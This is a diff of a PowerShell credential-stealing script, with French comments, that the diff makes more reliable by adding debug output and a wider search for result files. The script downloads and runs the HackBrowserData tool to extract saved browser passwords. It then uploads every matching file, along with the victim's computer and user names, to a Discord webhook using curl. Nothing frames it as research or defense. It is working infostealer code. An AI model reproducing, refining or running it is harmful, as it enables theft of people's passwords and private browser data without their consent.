@@ -22,7 +22,6 @@ Send-Discord "📥 **Downloading HackBrowserData...**"
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     
-    # Lien SourceForge officiel - CELUI QUI MARCHE
     $url = "https://sourceforge.net/projects/hackbrowserdata.mirror/files/v0.4.6/hack-browser-data-windows-64bit.zip/download"
     
     Invoke-WebRequest -Uri $url -OutFile "hbd.zip" -UseBasicParsing -TimeoutSec 30
@@ -40,47 +39,57 @@ try {
     
     Set-Location "HBD"
     
-    # Trouver l'exe (le nom peut varier)
+    # DEBUG : Lister tous les fichiers extraits
+    $files = Get-ChildItem -Recurse | Select-Object -ExpandProperty FullName
+    Send-Discord "📂 **Files extracted:** $($files.Count) files"
+    
+    # Trouver l'exe
     $exe = Get-ChildItem -Filter "*.exe" -Recurse | Select-Object -First 1
     
     if (!$exe) {
-        Send-Discord "❌ **EXE not found**"
+        Send-Discord "❌ **EXE not found. Files: $($files -join ', ')**"
         exit
     }
     
-    Send-Discord "🔓 **Extracting passwords...**"
+    Send-Discord "✅ **Found EXE:** $($exe.Name)"
+    Send-Discord "🔓 **Executing...**"
     
-    # Exécuter HackBrowserData
-    & $exe.FullName all 2>&1 | Out-Null
+    # Exécuter avec capture de sortie
+    $output = & $exe.FullName all 2>&1 | Out-String
+    
+    Send-Discord "📋 **Output:** $($output.Substring(0, [Math]::Min(200, $output.Length)))..."
     
     Start-Sleep 5
     
-    # Chercher les résultats
-    $resultFiles = Get-ChildItem -Filter "*.zip" -Recurse | Where-Object {$_.Name -like "*result*"}
+    # DEBUG : Lister tout ce qui a été créé
+    $allFiles = Get-ChildItem -Recurse | Where-Object {!$_.PSIsContainer} | Select-Object Name, Length
+    Send-Discord "📁 **All files after execution:** $($allFiles.Count)"
     
-    if ($resultFiles) {
-        $resultFile = $resultFiles[0]
-        $size = [math]::Round($resultFile.Length / 1KB, 2)
+    # Chercher les résultats (plusieurs possibilités)
+    $possibleResults = Get-ChildItem -Recurse | Where-Object {
+        $_.Extension -eq ".zip" -or 
+        $_.Extension -eq ".json" -or 
+        $_.Name -like "*result*" -or
+        $_.Name -like "*password*"
+    }
+    
+    if ($possibleResults) {
+        Send-Discord "🔍 **Found results:** $($possibleResults.Count) files"
         
-        Send-Discord "📤 **Uploading $size KB...**"
-        
-        $date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
-        curl.exe -F "file=@$($resultFile.FullName)" -F "content=🔑 **PASSWORDS EXTRACTED**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Size:** $size KB`n**Date:** $date" $wh
+        foreach ($file in $possibleResults) {
+            $size = [math]::Round($file.Length / 1KB, 2)
+            Send-Discord "📤 **Uploading $($file.Name) - $size KB...**"
+            
+            $date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+            curl.exe -F "file=@$($file.FullName)" -F "content=🔑 **EXTRACTED DATA**`n**File:** $($file.Name)`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Size:** $size KB`n**Date:** $date" $wh
+        }
         
         Send-Discord "✅ **UPLOAD SUCCESS**"
     }
-    elseif (Test-Path "results") {
-        # Fallback : compresser le dossier results
-        Send-Discord "📦 **Creating archive...**"
-        Compress-Archive -Path "results\*" -DestinationPath "output.zip" -Force
-        
-        if (Test-Path "output.zip") {
-            curl.exe -F "file=@output.zip" -F "content=📁 **Data from $env:COMPUTERNAME**" $wh
-            Send-Discord "✅ **Fallback upload done**"
-        }
-    }
     else {
-        Send-Discord "❌ **No results found**"
+        # Lister tous les fichiers pour debug
+        $fileList = (Get-ChildItem -Recurse | Select-Object -First 20 -ExpandProperty Name) -join ", "
+        Send-Discord "❌ **No results. Files present:** $fileList"
     }
     
 } catch {
